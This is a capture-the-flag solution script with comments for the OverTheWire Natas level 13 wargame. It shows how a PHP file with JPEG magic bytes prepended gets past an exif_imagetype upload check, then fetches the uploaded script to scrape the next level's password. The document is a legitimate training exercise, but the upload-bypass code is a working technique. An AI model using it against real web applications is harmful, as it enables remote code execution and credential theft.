'''
This challenge is more advanced.
We can see that at the front page they are saying
"For security reasons, we now only accept image files!"
Although you don't have to believe them and try to upload something else, like the file from the last challenge, but it's gonna fail.
'''
import requests
import re

username = "natas13"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)
'''
Looking through the index-source.html we can see the next part of the code.

.....

else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
	echo "File is not an image";

.....

So what exif_imagetype does? It checks the first bytes of the file to see if it is an image or not.
I have to modify the first bytes of the previous file, so I opened the hex code of a jpg image and I copy/pasted the first 12 bytes to my malicious php file.
Now I have an image that can execute php code, that's neat. I will upload the new file to the server and I will get the password.

(SEE the files "natas13_bytes.png" and "natas13_pass.php" for more info.)
'''

# Check the natas12_pass.php file for more info. Also you need to send the file as bytes so that's why it is "rb". Also there is a pic related for this challenge.
response = session.post(url,files = {"uploadedfile": open("natas13_pass.php", "rb")}, data = {"filename": "natas13_pass.php" }, auth=(username,password))
print(response.text)
print("="*50)

# Just Code Printing
path = re.findall('href="upload/(.*).php"', response.text)[0]
new_url = url + "/upload/" + path + ".php"
response = session.get(new_url,auth=(username,password))
print("\nThe password for the next level is: " + re.findall(r"[a-zA-Z0-9]{32}",response.text)[0])
